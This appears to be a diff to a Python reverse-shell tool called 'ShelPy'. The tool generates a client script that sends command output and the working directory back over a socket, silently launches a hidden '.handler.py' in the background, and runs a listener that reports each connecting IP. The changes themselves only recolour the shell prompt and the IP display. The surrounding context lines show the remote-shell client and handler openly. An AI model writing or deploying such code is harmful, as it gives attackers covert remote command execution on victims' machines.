@@ -44,7 +44,7 @@ while True:
 
 		output_str = str(output_bytes, 'utf-8')
 
-		s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+		s.send(str.encode(output_str + str('\033[01;31mShelPy\033[0m')+ str(os.getcwd()) + '> '))
 ''')
 
 arq.close()
@@ -86,7 +86,7 @@ os.system("python3 .handler.py &>> /dev/null")
 			
 			os.system('clear')
 
-			print('\033[01;32m[*] IP Conectado:\033[0m {}\n'.format(address[0]))
+			print('\033[01;32m[*] IP Conectado:\033[0m \033[01;34m{}\033[0m\n'.format(address[0]))
 
 			client_response = str(conn.recv(1024), 'utf-8')
 			
@@ -153,7 +153,7 @@ while True:
 
 		output_str = str(output_bytes, 'utf-8')
 
-		s.send(str.encode(output_str + str.encode('\033[01;31mShelPy\033[0m', 'utf-8') + str(os.getcwd()) + '> '))
+		s.send(str.encode(output_str + str('\033[01;31mShelPy\033[0m') + str(os.getcwd()) + '> '))
 ''')
 
 arq.close()
@@ -195,7 +195,7 @@ os.system("python3 .handler.py &>> /dev/null")
 			
 			os.system('clear')
 
-			print('\033[01;32m[*] IP Conectado:\033[0m {}\n'.format(address[0]))
+			print('\033[01;32m[*] IP Conectado:\033[0m \033[01;34m{}\033[0m\n'.format(address[0]))
 
 			client_response = str(conn.recv(1024), 'utf-8')
 			
@@ -257,7 +257,7 @@ def handler():
 		
 		os.system('clear')
 
-		print('\033[01;32m[*] IP Conectado:\033[0m {}\n'.format(address[0]))
+		print('\033[01;32m[*] IP Conectado:\033[0m \033[01;34m{}\033[0m\n'.format(address[0]))
 
 		client_response = str(conn.recv(1024), 'utf-8')
 		
